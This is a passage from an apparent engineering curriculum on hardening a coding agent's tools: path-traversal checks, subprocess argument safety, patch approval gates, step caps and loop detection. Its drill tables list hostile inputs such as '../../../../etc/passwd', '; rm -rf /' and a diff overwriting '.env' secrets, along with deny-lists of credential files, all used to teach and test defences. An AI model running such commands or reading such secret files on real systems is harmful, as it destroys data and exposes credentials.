Cost and latency engineering for search_code. Every call spends two external round-trips (embed +
rerank) and returns up to 500 chars × top_k into context — each char costs tokens on *every*
subsequent LLM step. Measure: add a profiling run in `notes.md` (`## 3.3 search_code economics`)
using `cost_tracker` from `src/devmate/obs/cost.py` (record per-query token counts; the
`estimate_cost(model, prompt_tokens, completion_tokens)` helper) — record p50/p95 latency via the
`tracer` spans already emitted by `agent.py` (`agent.tool` spans). Then make a decision with an
ADR-style write-up: options are (A) keep top_k=5 with 500-char truncation, (B) drop top_k default
to 3 and truncate to 250 chars, (C) add result caching keyed on query+language. Pick with the
measured numbers, state consequences (recall loss vs. context budget), and give revisit conditions.

**Verify:** your notes section contains measured numbers (not guesses) and a chosen option; if you
implemented caching, `poetry run pytest tests/unit/test_search_code_cache.py -q` passes (unit test
with a fake retriever).

**Common failure modes:**
- Symptom: test fails with `Connection refused` on Qdrant → Cause: `make up` not run or containers
  stopped → Fix: `make ps` to check; the test is integration-marked for exactly this reason.
- Symptom: `embedding_service.embed` raises "no API key" → Cause: external dependency → Fix: the
  tool already catches and returns `success=False`; the integration test should assert on *either*
  success or a documented error observation, or you stub `embedding_service` for the unit path.
- Symptom: results order looks wrong → Cause: reranker changed scores — the tool formats
  `result.score` (post-rerank), which is why `(score: 0.912)` differs from the raw vector score.

**Interview:** *"How does search_code actually work end to end, and what are its failure modes?"*
A strong answer: query → embedding → vector retrieval with optional language filter → rerank →
format into a bounded, tagged observation. Failure modes: empty index (returns "No results found."
— a valid observation, agent should search differently or read files), external API errors
(success=False observation, agent recovers), low top_k recall (semantic miss — the agent's loop
exists to retry with another query), and cost (every result burns context tokens — hence bounds).

### Topic 3.3c — read_file: Path Traversal Defense, Size Limits, Binary Files

**Mastery =** you can explain and test the traversal defense, the size policy, and the binary-file
behavior; you can write the threat model for "agent reads files".

**Level 1 — Drill** (mechanics, 20–45 min)
Given the real implementation (`Path.cwd()` as repo root, `full_path = (repo_root / file_path).resolve()`,
then `full_path.relative_to(repo_root)` in a try/except → `"Path traversal not allowed"`), predict
the result for each input (assume cwd = `projects/04-ai-engineering/devmate`):

| # | `file_path` | Expected result |
|---|-------------|-----------------|
| 1 | `src/devmate/config.py` | success — resolves inside root |
| 2 | `../../../../etc/passwd` | error `Path traversal not allowed` — resolve() collapses `..`, relative_to fails |
| 3 | `C:\Windows\System32\drivers\etc\hosts` (absolute Windows path) | `Path.cwd() / absolute` yields the absolute path; resolve() keeps it; relative_to fails → `Path traversal not allowed` |
| 4 | `src/../src/devmate/config.py` | success — `..` collapses *inside* the root |
| 5 | `missing.py` | error `File not found: missing.py` |
| 6 | `src/devmate` (a directory) | error `Not a file: src/devmate` |
| 7 | `src/devmate/.env` (if present) | success today — the tool has **no secret/deny-list** (a finding for L3) |
| 8 | `" "` / empty string | `repo_root / ""` resolves to root dir → `Not a file: ` (directory error) |

**Expected key:** as above. Two subtleties to write down: `resolve()` before `relative_to` is the
order that defeats `..` (naive code that checks the *string* is bypassed by `a/../b`); and
`relative_to(repo_root)` where `repo_root` is NOT itself resolved is a real bug class — check
`agent.py`: `repo_root = Path.cwd()` (already absolute), then `full_path.relative_to(repo_root)` —
cwd is absolute so this holds; if `repo_root` were relative, every absolute path would pass. Name
that as a code-review finding.

**Level 2 — Applied** (DevMate, 1–3 h)
Harden `ReadFileTool` in `agent.py`: (1) **size limit** — files > 1 MB return
`ToolResult(success=False, error="File too large: {size} bytes (limit 1 MB)")` (reject, don't
truncate — the agent must choose a different strategy); (2) **non-UTF8** — read with
`errors="replace"` so a binary-ish file yields a degraded-but-safe string, and add a metadata flag
`encoding_warnings: True` when replacement happened; (3) **empty file** — `read_text` returns `""`;
return success with content `"(empty file)"` and `size: 0` (a deterministic observation beats an
empty string the model may misinterpret). Write
`projects/04-ai-engineering/devmate/tests/unit/test_read_file_tool.py` covering: the 8 drill
inputs (against a tmp_path-based fake root), a > 1 MB file, a non-UTF8 file (write `b"\xff\xfe"`),
and the empty file. Do not modify the traversal logic unless a test fails — the defense is already
correct.

**Acceptance criteria:** ≥ 12 tests pass; traversal tests prove `..`, absolute-path, and inside-root
cases; no file outside the fake root is ever read (assert by checking no exception leaks an
absolute path in `content`).

**Verify:**
```bash
cd projects/04-ai-engineering/devmate
poetry run pytest tests/unit/test_read_file_tool.py -q
```
Expected: ≥ 12 passed.

**Level 3 — Stretch** (production-grade, 3–6 h)
Write the full **read_file threat model** into `notes.md` (`## 3.3 read_file threat model`) and
close the gaps you find. Threat classes: (1) symlink escape — a repo may contain a symlink pointing
outside the root; `resolve()` follows it, so `relative_to` fails *after* resolution → blocked, but
*verify* with a test (create `link -> /outside/target`, assert blocked); (2) TOCTOU — check-then-
read race: path checked inside root, swapped to a symlink before read (mitigation: open via
`os.open` with `O_NOFOLLOW` on Linux, or re-resolve after open); (3) sensitive files — `.env`,
`.ssh/`, `id_rsa`, `*.pem`, `secrets.*`: decide a deny-list policy (BLOCK with reason) vs.
warn-only, and justify; (4) huge-file DoS — the 1 MB limit from L2; (5) compression-bomb-ish
content — irrelevant for plain text, but state why. Pick the ONE mitigation that is not yet
implemented, implement it with a test, and write the ADR-style decision (options: deny-list BLOCK /
WARN + redact / allow with logging; consequences: false positives on legit customer repos vs.
secret exfiltration risk).

**Verify:** `poetry run pytest tests/unit/test_read_file_tool.py -q` (extended with symlink and
deny-list tests) passes; `grep -n "3.3 read_file threat model" notes.md`; your written threat model
lists ≥ 4 threat classes with mitigations and the chosen policy.

**Common failure modes:**
- Symptom: `..` traversal passes the test → Cause: you checked the string instead of the resolved
  path, or you didn't `resolve()` before `relative_to` → Fix: resolve first, then containment check
  (this is exactly the lecture's `path.resolve().relative_to(Path.cwd().resolve())`).
- Symptom: `UnicodeDecodeError` on a vendored binary → Cause: `read_text` default strict → Fix:
  `errors="replace"` + metadata flag; the agent should see degraded-but-readable, not a crash.
- Symptom: the model keeps re-reading a 5 MB file because the error doesn't say the size → Cause:
  error message lacks the fact that decides the next action → Fix: include size and limit in the
  error (the observation is the model's only feedback channel).

**Interview:** *"How do you prevent path traversal in an agent file-read tool?"*
A strong answer: never trust the string — `Path(cwd) / user_path`, call `.resolve()` (collapses
`..`, follows symlinks), then require `resolved.relative_to(cwd.resolve())` inside try/except; the
except returns a structured error observation. Then layer: symlink policy, size limits, binary
handling, and a sensitive-path deny-list. Name the TOCTOU class and the fix (re-resolve after open /
O_NOFOLLOW) to show depth. Close with: the tool must never crash — every attack becomes an
*observation* the agent can reason about.

### Topic 3.3d — run_tests: Subprocess Safety, Timeouts, Output Truncation

**Mastery =** you can reason about subprocess argument safety, prove the timeout behavior, and
budget the output size that flows back into the model's context.

**Level 1 — Drill** (mechanics, 20–45 min)
The real tool builds `cmd = ["python", "-m", "pytest"]`; then `cmd.extend(args.split())`; then
`cmd.append(test_path)`; then `subprocess.run(cmd, capture_output=True, text=True, timeout=120)`
— no shell. For each input, write the exact argv list and whether it is dangerous:

| # | `args` | `test_path` | Resulting argv (dangerous?) |
|---|--------|-------------|------------------------------|
| 1 | `-v` | `tests/unit/test_chunker.py` | `python -m pytest -v tests/unit/test_chunker.py` — safe |
| 2 | `-v -x` | `None` | `python -m pytest -v -x` — safe |
| 3 | `; rm -rf /` | `None` | `python -m pytest ; rm -rf /` — **argv element, NOT shell-executed** — `;` is literal, harmless (this is why `shell=False` matters) |
| 4 | `-p no:cacheprovider` | `None` | `python -m pytest -p no:cacheprovider` — safe |
| 5 | `-v` | `-p no:cacheprovider` | `python -m pytest -v -p no:cacheprovider` — **option injection!** `test_path` starting with `-` becomes a pytest option, not a file |
| 6 | `-v` | `tests/unit` | `python -m pytest -v tests/unit` — safe |
| 7 | `--co` | `None` | `python -m pytest --co` — pytest rejects unknown option (exit 4) — noisy but not dangerous |

**Expected key:** rows as above; the two findings: (1) `shell=False` + argv list defeats shell
injection — never "fix" it to a string; (2) `test_path` is untrusted input and `-`-prefixed values
are option injection — must be rejected. Also state the timeout contract: `timeout=120` raises
`TimeoutExpired` → caught → `ToolResult(success=False, error="Test execution timed out (120s)")`.

**Level 2 — Applied** (DevMate, 1–3 h)
Harden `RunTestsTool` in `agent.py`: (1) reject `test_path` starting with `-` (return
`Error: test_path must be a path, not options: ...`); (2) **truncate** output to a budget — keep
the first 8,000 chars and append `... (truncated, {total} chars total)`; the full output is a
token bomb if it all enters context; (3) keep the 120 s timeout, but make it a class constant
`TIMEOUT_SECONDS = 120` so tests can override. Write
`projects/04-ai-engineering/devmate/tests/unit/test_run_tests_tool.py`: mock `subprocess.run` to
capture `cmd` for rows 1–7 (assert exact argv), simulate `TimeoutExpired` (assert the error
observation), and assert truncation on a fake 20 KB stdout.

**Acceptance criteria:** ≥ 9 tests pass; the option-injection case (row 5) is rejected *before*
subprocess; the tool never constructs a shell string.

**Verify:**
```bash
cd projects/04-ai-engineering/devmate
poetry run pytest tests/unit/test_run_tests_tool.py -q
```
Expected: ≥ 9 passed.

**Level 3 — Stretch** (production-grade, 3–6 h)
The full subprocess policy + cost model. Write into `notes.md` (`## 3.3 run_tests policy`):
(1) **output economics** — each run_tests observation enters the LLM context and is re-sent every
step; with 8k-char truncation at ~0.25 tokens/char, one run ≈ 2k tokens × remaining steps — a
10-step run with 4 test calls can spend ~40k tokens on test output alone. Show the math with the
prices from 3.2. (2) **concurrency policy** — a single agent must not spawn overlapping pytest
processes (lock or reject if a run is in flight); decide and justify. (3) **arg allowlist** —
decide whether arbitrary `args` strings stay allowed (they are the injection vector for pytest
plugin options like `--pdb` which *blocks on stdin* — a hang risk) or restrict to an allowlist
(`-v`, `-x`, `-q`, `-k`, `--no-header`, ...). Implement the allowlist or the in-flight lock with a
test, and write the ADR-style decision including the revisit condition (e.g., "revisit when the
suite exceeds 5 min — timeout 120 s must rise, and truncation budget must shrink").

**Verify:** unit tests pass; `grep -n "3.3 run_tests policy" notes.md`; your written section shows
the token math and the chosen policy.

**Common failure modes:**
- Symptom: "agent hangs forever" on run_tests → Cause: pytest with `--pdb` waits on stdin, or the
  suite exceeds 120 s and TimeoutExpired surfaced as a raw exception in an older build → Fix:
  timeout is handled; `--pdb`-style args belong on the allowlist blacklist.
- Symptom: full test output floods context → Cause: no truncation → Fix: L2 truncation with total
  length in the observation (model learns it was truncated).
- Symptom: someone "simplifies" to `subprocess.run(f"python -m pytest {args}", shell=True)` →
  Cause: convenience over safety → Fix: revert; the argv list is the security boundary — a test
  asserting `shell=False` and no string interpolation in cmd is your guard.

**Interview:** *"You're giving an LLM a tool that runs subprocesses. What's your threat model?"*
A strong answer: shell injection (killed by argv lists, `shell=False`), option injection through
untrusted args (killed by `-` rejection / allowlist), hangs (timeout + no blocking flags),
resource exhaustion (in-flight lock, output truncation), and token cost (truncation budget). State
the rule: the tool is a *read-only oracle* today — it can't write files, so its blast radius is
bounded to CPU/time/tokens — and that boundary must be preserved when you later add patch tools.

### Topic 3.3e — propose_patch: Diff Validation, No Blind Writes, Human Approval Gate

**Mastery =** you can validate a diff, explain why the tool must never write to disk, and design
an approval gate.

**Level 1 — Drill** (mechanics, 20–45 min)
The real tool validates `diff.startswith("---")` and `"+++" in diff` and rejects otherwise
(`"Invalid diff format"`); it never writes anything (comment says: "In a real implementation, this
would create a PR or save the patch"). Classify each diff as VALID / INVALID with the exact reason:

| # | Diff (abridged) | Verdict |
|---|-----------------|---------|
| 1 | `--- a/src/devmate/config.py\n+++ b/src/devmate/config.py\n@@ -1,3 +1,4 @@\n ...` | VALID — unified diff header |
| 2 | `+++ b/src/devmate/config.py\n@@ -1,3 +1,4 @@` (no `---`) | INVALID — missing `---` (startswith check fails) |
| 3 | `--- a/src/devmate/config.py\n@@ -1,3 +1,4 @@` (no `+++`) | INVALID — `+++` not found |
| 4 | `--- a/x\n+++ b/x\n this is not a diff body` | VALID by the tool's shallow check — header present, but body is garbage (a finding: validation is structural-only) |
| 5 | empty string | INVALID — startswith("---") fails |
| 6 | `--- a/.env\n+++ b/.env\n-API_KEY=...\n+API_KEY=evil` | VALID by the tool — **but the file should be blocked** (sensitive-file policy gap) |

**Expected key:** as above. The lesson: the current check is a *smell check*, not validation —
`git apply --check` is the real validator (L2/L3 use it). Row 6 is the security finding: the tool
must not propose patches to secrets.

**Level 2 — Applied** (DevMate, 1–3 h)
Implement the **human approval gate** end-to-end: (1) `ProposePatchTool.execute` — on a valid
diff, write the patch to `projects/04-ai-engineering/devmate/patches/pending/{uuid}.patch` (create
the dir), and return `ToolResult(success=True, content="Patch proposed: patches/pending/{uuid}.patch ...")`
— **never writes to the target file**; (2) add a deny-list so diffs targeting `.env`, `.env.*`,
`*.pem`, `id_rsa*`, `.ssh/*` are rejected with a reason; (3) add a separate function
`apply_pending_patch(patch_id)` (not a tool — an operator function) that runs
`git apply --check` and only on success applies for real, returning the result; (4) write
`projects/04-ai-engineering/devmate/tests/unit/test_propose_patch_tool.py`: diff rows 1–6,
deny-list cases, and an apply test in a **temporary git repo** (init, commit, apply, assert file
content changed; use `git apply --check` failure path too). Keep `execute` side-effect-free apart
from writing into `patches/pending/`.

**Acceptance criteria:** ≥ 10 tests; no test ever modifies a real DevMate source file (temp repos
only); the gate is: propose → file on disk → operator approves → `git apply --check` → real apply.

**Verify:**
```bash
cd projects/04-ai-engineering/devmate
poetry run pytest tests/unit/test_propose_patch_tool.py -q
git status --porcelain projects/04-ai-engineering/devmate/src | head
```
Expected: tests pass; `git status` shows **no modified source files** (proof of "no blind writes").

**Level 3 — Stretch** (production-grade, 3–6 h)
Design the **patch lifecycle as a product decision**, written ADR-style into `notes.md`
(`## 3.3 Patch approval ADR`): options — (A) propose → human approves via CLI prompt → apply; (B)
propose → PR via GitHub API (needs token, review flow); (C) propose → apply automatically with
rollback. Decide for DevMate's MVP with the lecture's rule ("Safety: no file writes" from the code
challenge) and the 4-tool constraint (ADR-009 in the lecture). Your ADR must cover: the approval
*channel* (who approves — a human at a terminal, or a human in an MCP client UI, and how the
channel itself is authenticated), auditability (every approved patch logged with the human's
decision), rollback (git revert of the applied commit), and the sensitive-file policy from L2.
Implement the chosen option's *minimum viable slice* with a test (e.g., the CLI `ask` flow prints
the diff, prompts `Apply? [y/N]`, and only `y` applies — test the prompt logic with monkeypatched
input, and `N` leaves the tree clean).

**Verify:** unit tests for the prompt logic pass; `grep -n "3.3 Patch approval ADR" notes.md`; the
ADR names options A/B/C, a chosen path, consequences, and revisit conditions (e.g., "revisit when
the workspace gets a GitHub remote — option B becomes viable").

**Common failure modes:**
- Symptom: the tool writes directly to the target file "because it's faster" → Cause: skipping the
  gate → Fix: the gate exists because an autonomous loop applying un-reviewed diffs to a repo is a
  supply-chain incident waiting to happen; test `git status` stays clean after `execute`.
- Symptom: `git apply` fails on context mismatch → Cause: the diff was generated against a
  different commit → Fix: `git apply --check` before apply — the error message tells the model to
  regenerate against current HEAD.
- Symptom: diffs to `.env` sail through → Cause: no deny-list → Fix: L2 deny-list + test.

**Interview:** *"Your agent can propose code changes. How do you keep it from doing damage?"*
A strong answer: three walls — (1) propose-only: the tool writes a patch file, never the target;
(2) validation: structural check + `git apply --check` against the real tree; (3) human gate:
approval is required and recorded, with rollback (git revert) designed in. Plus policy: deny-listed
paths (secrets) can't be patched at all. The principle: autonomy must be bounded by reversibility —
every consequential action either is reversible or has a human in the loop.

---

## 3.4 Building a ReAct Agent from Scratch

### Real-world problem

The startup's naive hand-rolled agent ships to one pilot customer. The pilot's report: "the agent
repeated the same search 40 times, then said 'Maximum steps reached'. The log was one flat blob —
we couldn't tell which step did what, and we still don't know why it repeated." Postmortem reads:
parser crashed on the model's trailing-comma JSON (raw fallback → `TypeError` inside `execute` was
caught, but the agent kept retrying the same bad call), no step cap beyond the loop's own
`range(max_steps)` (which worked, but burned 40 steps), and zero loop detection (identical
`action + input` repeated without any signal). **The decision:** the loop itself must be robust —
parsing must never crash, the step budget must be explicit and observable, and repeated states
must be detected and stopped. All three are testable with tapes, no LLM required.

### Topic 3.4a — Response Parsing: Section Buffers, JSON Decode Fallback, Robustness

**Mastery =** you can state the parser's invariants (never raises, always fills 4 fields), and you
can extend it for new malformed classes without breaking old ones.

**Level 1 — Drill** (mechanics, 20–45 min)
Extend the parsing drill from 3.2b with the *invariant* framing. For each input, state the output
AND the invariant it exercises (never-raise / all-fields-filled / no-data-loss):

| # | Input | Output | Invariant |
|---|-------|--------|-----------|
| 1 | `Thought: a\nAction: b\nInput: {"k": 1}` | standard parse | all-fields |
| 2 | `Input: {"k": 1,}` | `{"raw": ...}` fallback (today) | never-raise |
| 3 | `Input: ```json\n{"k": 1}\n```\n` | raw fallback **today** (fence not stripped — L2 of 3.2b fixes it) | never-raise |
| 4 | `Thought:\nAction: run_tests\nInput: {"args": "-v -x"}\nFinal Answer: done` | thought="", action=run_tests, input parsed, final="done" | all-fields (empty thought is valid) |
| 5 | `{"k": 1}` with no section headers | all empty → unknown-action observation | never-raise |
| 6 | `Action: read_file\nInput: {"file_path": "weird \"quote\" file.py"}` | input parsed with escaped quotes | no-data-loss |
| 7 | 10 KB of unicode prose with one `Action:` line in the middle | action parsed; rest lands in thought | no-data-loss |
| 8 | `Final Answer: 🚀 deploy` (emoji) | final="🚀 deploy" | no-data-loss |

**Expected key:** as above. The invariant list is the topic's core: (1) **never raises**, (2)
**all four fields always present** (possibly empty), (3) **no data loss** — continuation lines are
joined into the current section. A parser that violates any invariant is a bug; write the three
invariants at the top of your notes for this topic.

**Level 2 — Applied** (DevMate, 1–3 h)
Refactor `_parse_response` / `_save_field` in `agent.py` to remove the `locals()` hack (the
current code passes `locals()` into `_save_field` and mutates via dict — fragile and mypy-hostile)
and replace it with an explicit accumulator object or tuple. Behavior must stay identical for all
8 drill rows of 3.2b AND the 8 rows above (fence-stripping from 3.2b L2 may be included). Extend
`tests/unit/test_agent_parsing.py` with the invariant tests: a property-style test that runs 30
crafted strings and asserts: no exception, `isinstance(action_input, dict)`, and (thought, action,
final) are all `str`.

**Acceptance criteria:** all parsing tests pass; `make types` and `make lint` clean on the agent
module.

**Verify:**
```bash
cd projects/04-ai-engineering/devmate
poetry run pytest tests/unit/test_agent_parsing.py -q
poetry run mypy src/devmate/agent/agent.py && poetry run ruff check src/devmate/agent/agent.py
```
Expected: tests pass, mypy and ruff clean.

**Level 3 — Stretch** (production-grade, 3–6 h)
Decision: **keep the text protocol or move to native tool calls?** Most modern LLM APIs offer
structured tool-calling (the model returns typed `tool_calls`, no parsing at all). Write the
ADR-style decision into `notes.md` (`## 3.4 Parse protocol ADR`): options — (A) keep text
Thought/Action/Input and harden parsing (works on any model, including weak ones; parser is
testable), (B) switch to native `tool_calls` when available, fall back to text (better accuracy,
but two code paths to test), (C) hybrid: text everywhere, but validate inputs against schemas (the
3.3a contract). Then implement option B's *fallback wiring* in `agent.py`: if the LLM response
object exposes `tool_calls`, execute them; else parse text. Test: one tape returning
`tool_calls`, one returning text — both reach the same tool and produce the same observation
shape.

**Verify:** `poetry run pytest tests/unit/test_agent_parsing.py -q` passes with both modes;
`grep -n "3.4 Parse protocol ADR" notes.md`; your ADR names consequences (dual-path test burden vs.
parser failure rate) and a revisit condition (e.g., "revisit when >5% of runs hit the raw
fallback").

**Common failure modes:**
- Symptom: parser "works" but silently drops a section → Cause: a continuation line starting with
  `Action:` inside a thought (the model wrote "Action:" mid-thought) → Fix: section markers are
  line-start-strict (`startswith` on stripped lines — already true in DevMate) — accept the
  consequence: a mid-thought marker is a new section by design; document it.
- Symptom: refactor changes behavior → Cause: `locals()` mutation semantics are subtle → Fix: the
  invariant tests (all 16 rows) must run before and after; behavior parity is the contract.
- Symptom: mypy errors after refactor → Cause: `_save_field(..., local_vars: dict)` had no types
  → Fix: typed accumulator; this is the point of the refactor.

**Interview:** *"Your agent's brain is text parsing. What are the invariants, and when do you abandon it?"*
A strong answer names the three invariants (never raise, all fields filled, no data loss), shows
the fallback chain, then the migration trigger: when the model reliably supports native tool calls
and your eval shows the parser is the bottleneck (raw-fallback rate > ~5%), switch — but keep the
text path as a testable compatibility layer. The parser is not an implementation detail; it is the
agent's ABI.

### Topic 3.4b — Step Cap: Hard Limit and Cost Protection

**Mastery =** you can compute the cost of an uncapped loop, set a defensible cap, and make the cap
*observable* (why did the run stop?).

**Level 1 — Drill** (mechanics, 20–45 min)
Cost math (prices from 3.2): input $3/M tokens, output $15/M tokens, per step ≈ 1.5k input + 300
output. Compute the worst-case run cost for `max_steps ∈ {1, 5, 10, 100}` and for the $412
incident (≈1,900 calls, growing context — use a flat 10k avg tokens/call at $5/M blended for
simplicity). Fill the table:

| max_steps | LLM calls | Input tokens | Output tokens | Est. cost |
|-----------|-----------|--------------|---------------|-----------|
| 1 | 1 | 1,500 | 300 | $0.009 |
| 5 | 5 | 7,500 | 1,500 | $0.045 |
| 10 | 10 | 15,000 | 3,000 | $0.09 |
| 100 | 100 | 150,000 | 30,000 | $0.90 |
| uncapped (incident) | 1,900 | ~19,000,000 | ~570,000 | ~$412 |

**Expected key:** as above (incident ≈ $412 is the anchor). Then answer from the real code: what
does `ReActAgent(max_steps=0)` do? (`run()`: `range(0)` → no iterations → returns the fallback
string immediately — a *harmless, deterministic* degenerate case; assert it in a test). And what
is the current default? (`max_steps: int = 10` in `__init__`.)

**Level 2 — Applied** (DevMate, 1–3 h)
Make the cap observable. `AgentContext` has `metadata: Dict[str, Any]` — record
`metadata["termination_reason"]`: `"completed"` (Final Answer), `"max_steps"` (cap hit),
`"loop_detected"` (3.4c), `"error"` (uncaught failure). In `run()`, set it on every exit path
(including the early return on Final Answer). Then write
`projects/04-ai-engineering/devmate/tests/unit/test_step_cap.py`: (1) stub LLM that *never* emits
Final Answer → `max_steps=3` → assert return == fallback string, `current_step == 3`, exactly 3
tool calls recorded, `termination_reason == "max_steps"`; (2) stub that answers on step 2 →
`termination_reason == "completed"`, 1 tool execution; (3) `max_steps=0` → immediate fallback,
`termination_reason == "max_steps"`, zero LLM calls (assert the stub was never invoked).

**Acceptance criteria:** ≥ 3 tests; the test proves *exactly* the budget was consumed — no more.

**Verify:**
```bash
cd projects/04-ai-engineering/devmate
poetry run pytest tests/unit/test_step_cap.py -q
```
Expected: `3 passed`.

**Level 3 — Stretch** (production-grade, 3–6 h)
Cost protection beyond step count: a **token budget** that stops the run when spend exceeds a
ceiling, independent of steps (a 10-step cap still allows a 40k-token run if observations are huge
— see 3.8d). Use `cost_tracker` from `src/devmate/obs/cost.py`: after each step, compute
cumulative tokens (sum `TokenUsage` from the LLM responses) and stop with
`termination_reason == "budget_exceeded"` when cumulative input+output tokens exceed
`max_tokens_total` (configurable, default e.g. 30k). Write the ADR-style decision in `notes.md`
(`## 3.4 Budget ADR`): options — steps-only / tokens-only / both; chosen: both with defaults; and
the incident anchor: the $412 run would have died at step ~10 anyway with a 30k token budget —
show that. Tests: a tape with huge observations that hits the token budget at step 4 with
`max_steps=10` → assert `termination_reason == "budget_exceeded"` and step 4 recorded.

**Verify:** `poetry run pytest tests/unit/test_step_cap.py -q` (extended with budget tests) passes;
`grep -n "3.4 Budget ADR" notes.md`; your ADR shows the budget default and revisit condition
(revisit when default_model price changes — cost_tracker has `estimate_cost` for that).

**Common failure modes:**
- Symptom: run stops "early" and the user is confused → Cause: termination reason not visible →
  Fix: L2 — expose `termination_reason` in the CLI output and in the final message.
- Symptom: budget code double-counts tokens (LLM response tokens + tool output tokens) → Cause:
  unclear what "tokens" means → Fix: budget only LLM API tokens (tool output is context *re-sent*,
  counted as input on the next call — count it at the next step's input, which the LLM client
  reports).
- Symptom: `max_steps=0` crashes somewhere → Cause: code assumed ≥ 1 iteration → Fix: the
  degenerate-case test (case 3) locks the behavior.

**Interview:** *"Why is a step cap not enough to control agent cost?"*
A strong answer: step caps bound *iterations*, but cost is *tokens* — a 10-step run with giant
observations can exceed a 10-step run with small ones by 10×. Real control is layered: step cap
(kills loops), token budget (kills context bloat), tool output truncation (3.3d), and loop
detection (3.4c, kills *repetition* specifically). Each layer has a different trigger; the $412
run needed all four.

### Topic 3.4c — Loop Detection: State Fingerprints Across Iterations

**Mastery =** you can define a state fingerprint, detect exact and (stretch) near-duplicate loops,
and prove detection with a test.

**Level 1 — Drill** (mechanics, 20–45 min)
Define `fingerprint = hash(action, sorted(action_input.items()), observation)` — same action +
same input + same observation ⇒ same state. Given the step log below, mark each step's fingerprint
and identify the loop:

| Step | Action | Input | Observation (abridged) | Fingerprint |
|------|--------|-------|------------------------|-------------|
| 1 | search_code | {"query": "auth"} | "1 result: middleware/auth.py..." | F1 |
| 2 | read_file | {"file_path": "middleware/auth.py"} | "def require_auth..." | F2 |
| 3 | search_code | {"query": "auth"} | "1 result: middleware/auth.py..." | **F1 — repeat of step 1** |
| 4 | read_file | {"file_path": "middleware/auth.py"} | "def require_auth..." | **F2 — repeat of step 2** |

**Expected key:** steps 3–4 repeat fingerprints F1, F2 from steps 1–2 → **loop detected at step 3**
(a policy of "second occurrence of a fingerprint stops the run") and certainly at step 4. The
design question on paper: where do you stop — at the first repeat (step 3) or the second (step 4)?
First-repeat policy can false-positive on legitimate "re-search after new information" (the
*observation* differs if new info exists — that's why observation is in the fingerprint); write
one sentence on each policy's trade-off.

**Level 2 — Applied** (DevMate, 1–3 h)
Implement loop detection in `ReActAgent.run()` (`projects/04-ai-engineering/devmate/src/devmate/agent/agent.py`):
(1) after each step, compute `fingerprint = (action, json.dumps(action_input, sort_keys=True),
observation)` — use the observation *string* the model will see; (2) keep `seen: Dict[str, int]`
counts; (3) when a fingerprint is seen ≥ 2 times, stop with a **distinct** message:
`"Loop detected after {n} steps: the agent repeated action '{action}' with identical input and
observation. Stopping to prevent runaway cost."` and set `termination_reason = "loop_detected"`
(3.4b). Write `projects/04-ai-engineering/devmate/tests/unit/test_loop_detection.py`: a stub LLM
tape that repeats the same `search_code` 5 times → assert the run stops at step 2 (the second
occurrence), `termination_reason == "loop_detected"`, and only 2 tool calls happened; a control
tape with *different* queries → no loop stop, runs to Final Answer.

**Acceptance criteria:** ≥ 2 tests; the repeating tape provably stops before `max_steps` — this is
the roadmap's "infinite loops provably prevented — with a test" Definition of Done.

**Verify:**
```bash
cd projects/04-ai-engineering/devmate
poetry run pytest tests/unit/test_loop_detection.py -q
```
Expected: `2 passed`. This test is the DoD artifact — name it explicitly in `notes.md`.

**Level 3 — Stretch** (production-grade, 3–6 h)
Semantic loops: the model rephrases the query each time (`"auth"`, `"authentication"`,
`"auth middleware"`, `"login middleware"`) — hashes never match, the run spins until the step cap.
Design **similarity-based detection**: embed the observation (or action+input) each step via
`embedding_service` (already a dependency of search_code) and flag when cosine similarity to a
previous step exceeds a threshold (e.g., 0.95) with a different-fingerprint allowance for
"observation changed but intent identical". Cost: one extra embed per step (~1 call) — show the
budget impact against the 3.4b table. Then decide, ADR-style into `notes.md`
(`## 3.4 Loop detection ADR`): exact-match only (cheap, provable, misses rephrasing) vs.
exact+similarity (catches more, adds embed cost + false positives). Implement the chosen option
with tests: a rephrasing tape (3 queries, all hitting the same file) must stop at the 3rd, and a
legit multi-query tape (different files) must not false-positive.

**Verify:** `poetry run pytest tests/unit/test_loop_detection.py -q` (extended) passes; `grep -n
"3.4 Loop detection ADR" notes.md`; your ADR states threshold, cost, false-positive budget, and
revisit condition.

**Common failure modes:**
- Symptom: loop detection fires on a legit workflow ("search, read, search again with a different
  term") → Cause: fingerprint too narrow (observation excluded) or threshold too tight →
  Fix: include observation in the fingerprint; for similarity, measure and tune the threshold with
  your own tapes.
- Symptom: `json.dumps` order makes identical inputs hash differently → Cause: dict key order
  varies → Fix: `sort_keys=True` (the L2 spec includes it — this is a classic test-failure trap).
- Symptom: the loop returns a *generic* cap message and the user can't tell loop from step cap →
  Cause: no `termination_reason` (3.4b) → Fix: distinct message + reason; observability is the
  point of both topics.

**Interview:** *"How do you prove an agent can't loop forever?"*
A strong answer: three layers, each provable — (1) step cap: `range(max_steps)` guarantees
termination in finite iterations (a test with a never-answering stub); (2) token budget: finite
spend (3.4b L3); (3) loop detection: state fingerprinting with exact-match stop (a repeating-tape
test that asserts 2 calls, not 10). For rephrasing loops, similarity detection with a measured
threshold. Then the production line: "provably prevented with a test" is a *repo artifact*, not a
hope — the roadmap's DoD names it explicitly.

---

## 3.5 Production Agent: LangGraph

### Real-world problem

The startup passes its first security audit — barely. Findings: (1) the hand-rolled loop keeps all
state in memory; a crash mid-run loses everything and the agent starts over from scratch, costing
a full re-run; (2) there is no resume: an interrupted customer run cannot continue; (3) "who
approved that patch?" — nobody could answer, because there was no approval flow at all, and no
per-step record persisted; (4) the auditor asks for a diagram of the agent's control flow and the
engineers draw a scribble. The CTO's decision, mirroring the lecture's ADR-007: **move the agent
to a graph orchestrator** — explicit nodes and edges (auditable), checkpointing (crash-safe,
resumable), and human-in-the-loop gates (approval with a record). The engineering constraint: the
migration must not change the tools, the goals, or the eval numbers — it changes *where state
lives* and *how the loop is governed*.

### Topic 3.5a — StateGraph: Nodes, Edges, Conditional Edges, Typed State

**Mastery =** you can express any agent loop as a typed state machine, compile it, and test every
edge.

**Level 1 — Drill** (mechanics, 20–45 min)
On paper, draw the DevMate graph from the lecture's `StateGraph` snippet: nodes `agent` and
`tools`; `set_entry_point("agent")`; conditional edge from `agent` via `should_continue` →
`"tools"` or `END`; edge `tools → agent`. Then answer: (1) for a run that needs 2 tools, list the
full node sequence; (2) what does `should_continue` return when the last message has no
`tool_calls`? (`END`); (3) why is the `tools → agent` edge unconditional? (the tool result must
return to the reasoner — the agent always gets the observation); (4) what happens if a tool raises?
(today: `tool_node` would fail the run — a LangGraph question with a real answer: wrap each tool
call in try/except and return a `ToolMessage` with the error text — the error must become an
observation, not a crash, exactly like the hand-rolled loop). Write the typed state:
`AgentState(TypedDict)` with `messages`, `goal: str`, `steps: int` — and justify why `steps` is in
